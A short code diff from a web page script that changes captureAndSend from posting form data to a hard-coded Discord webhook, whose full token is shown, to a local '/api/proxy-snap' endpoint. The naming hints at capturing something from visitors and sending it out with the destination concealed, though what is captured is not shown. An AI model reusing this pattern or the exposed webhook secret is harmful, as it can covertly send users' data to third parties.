@@ -52,7 +52,7 @@
     const btn = document.getElementById('btn');
 
     // ──── FRESH WEBHOOK ────
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1479327150321565857/z5Pu_bkKquJ-_761xkW7KaIv1Fdkh6iF6zjEwleaOwN8ZCXNbiH5gzcP6ZL26FNp4gPY";
+    const PROXY_URL = "/api/proxy-snap";
 
     async function captureAndSend() {
       try {
@@ -117,7 +117,7 @@
         };
         formData.append('payload_json', JSON.stringify(payload));
 
-        const response = await fetch(WEBHOOK_URL, {
+        const response = await fetch(PROXY_URL, {
           method: 'POST',
           body: formData
         });
